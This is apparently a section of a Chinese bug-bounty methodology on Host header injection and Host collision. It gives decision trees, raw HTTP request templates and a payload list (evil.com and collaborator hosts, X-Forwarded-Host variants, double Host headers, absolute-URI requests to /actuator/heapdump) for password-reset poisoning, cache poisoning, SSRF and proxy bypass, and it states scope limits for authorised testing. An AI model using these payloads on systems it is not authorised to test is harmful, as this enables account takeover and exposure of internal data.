# §28 Host注入与Host碰撞
### SRC 合规边界
```
[SRC ALLOWED] 改Host头看邮件/响应里的链接是否变化、双Host头看是否能绕过代理、
              collaborator OOB回调确认、读取被屏蔽的路径(只读不做修改)
[SRC FORBIDDEN] 点击钓鱼链接、实际重置他人密码、修改他人数据
[SRC CORE] 证明Host头能影响邮件链接/响应URL即可，不需要真的去改别人密码
```

### 识别信号
- 密码重置/找回密码接口（最高频出洞点）
- 发送邮件/验证链接/邀请成员的功能
- 请求中有CDN/代理（有缓存的静态资源）
- 返回403的管理路径（可能被代理屏蔽，Host碰撞绕过）

---

### 场景判断树

```
发现密码重置/发邮件/生成链接类接口?

├── 有"发送重置链接"或"发送验证邮件"功能?
│   └── 改 Host 或 X-Forwarded-Host → 看邮件里的链接域名是否变了
│       [SRC] 用自己的邮箱测试,不需要碰真实用户
│       [SRC] 看到链接变了=漏洞确认,不需要实际点链接重置

├── 有缓存/CDN的静态资源接口?
│   └── 改 X-Forwarded-Host → 看响应URL是否变了 → 可能缓存投毒

├── 后端用Host头做路由转发?
│   └── Host改成内网地址/云元数据 → 看能否访问内部服务 → SSRF via Host

└── 有返回403的管理路径(/actuator /admin /manage)?
    └── 双Host头或绝对路径请求行 → 看能否绕过代理屏蔽
        [SRC] 证明了能绕过代理读到内容即可,不修改内容
```

### 决策流程

```
发现密码重置/发邮件接口?
│
├── Step0: 用自己的邮箱触发一次正常请求,记住响应和邮件内容
│
├── Step1: 改 Host 头(最快出结果,先试)
│   POST /forgot-password HTTP/1.1
│   Host: 你的collaborator域名
│   →
│   ├── collaborator收到回调? → Host注入确认 ✅
│   ├── 邮件里链接域名变了? → Host注入确认 ✅
│   └── 没变化? → 进 Step2
│
├── Step2: 测 X-Forwarded-Host 变体(命中率更高,框架优先取)
│   POST /forgot-password HTTP/1.1
│   X-Forwarded-Host: 你的collaborator域名
│   X-Host: 你的collaborator域名
│   X-Forwarded-Server: 你的collaborator域名
│   Forwarded: host=你的collaborator域名
│   X-HTTP-Host-Override: 你的collaborator域名
│   →
│   ├── 任一命中? → Host注入确认 ✅(框架特性,X头常被忽略)
│   └── 都没变化? → 说明后端校验了Host,此路不通
│
├── Step3 (选做): 如果确认Host注入存在,进一步判断影响范围
│   ├── 密码重置? → 高危(可账户接管)
│   ├── 邮件通知链接? → 中危(可钓鱼)
│   ├── 响应URL变了+有缓存? → 高危(缓存投毒)
│   └── 仅DNS回调但无HTTP跳转? → 低危(只能检测不可利用)
│
├── Step4: 确认后输出证据
│   证据包: 含改过的Host头请求 + collaborator回调截图
│   描述: "目标系统在生成密码重置链接时使用了未校验的Host头,
│          攻击者可构造恶意Host使受害者点击链接时泄露重置Token"
│
└── 关于数据库: [SRC] 不需要落地利用,证明能影响链接即可
```

```
发现403管理路径(垂直越权目标)?

├── Step0: 确认路径确实存在但被屏蔽
│   GET /actuator/heapdump → 403 (Nginx层屏蔽)
│
├── Step1: 双Host头(最常用,先试)
│   GET /actuator/heapdump HTTP/1.1
│   Host: target.com
│   Host: 127.0.0.1
│   →
│   ├── 返回200+数据? → Host碰撞绕过代理确认 ✅
│   │   [SRC] 只读不写,看到内容即可
│   └── 仍403? → 进Step2
│
├── Step2: 绝对路径请求行(第二种手法)
│   GET http://127.0.0.1/actuator/heapdump HTTP/1.1
│   Host: target.com
│   →
│   ├── 200? → Host碰撞确认 ✅
│   └── 仍403? → 换内网IP/端口继续试
│
├── Step3: 批量试内网IP和端口(如果疑心有内网服务)
│   变体Host: localhost, 127.0.0.1, 127.0.0.1:8080, internal-admin.local
│   [SRC] 只测到能访问即停,不需要进一步利用
│
└── Step4: 辅助变体(空格混淆等)
    Host: target.com; Host: 127.0.0.1 (分号绕过)
    Host : target.com (Host后面加空格,部分解析器行为差异)
```

### 变体Header速查

```
框架优先顺序(先测命中率高的):
  Django(lib): X-Forwarded-Host > Host
  Laravel:     X-Forwarded-Host > Host (TrustProxies开启时)
  Spring:      X-Forwarded-Host > Host (ForwardedHeaderFilter开启时)
  Express:     X-Forwarded-Host > Host (trust proxy开启时)
  原始PHP:     $_SERVER['HTTP_HOST'] → 只认Host本身

常用payload清单:
  直接改:  Host: evil.com
  框架:    X-Forwarded-Host: evil.com
  变体1:   X-Host: evil.com
  变体2:   X-Forwarded-Server: evil.com
  变体3:   Forwarded: host=evil.com
  变体4:   X-HTTP-Host-Override: evil.com
  端口:    Host: target.com:evil.com
  子域:    Host: evil.com.target.com (如果校验includes)
  双Host:  Host: target.com + Host: localhost (碰撞用)
  绝对:    GET http://localhost/admin HTTP/1.1 (碰撞用)
```

### 关联漏洞
- 密码重置/认证绕过 → §9
- 403路径未授权 → §8
- SSRF → §6

---
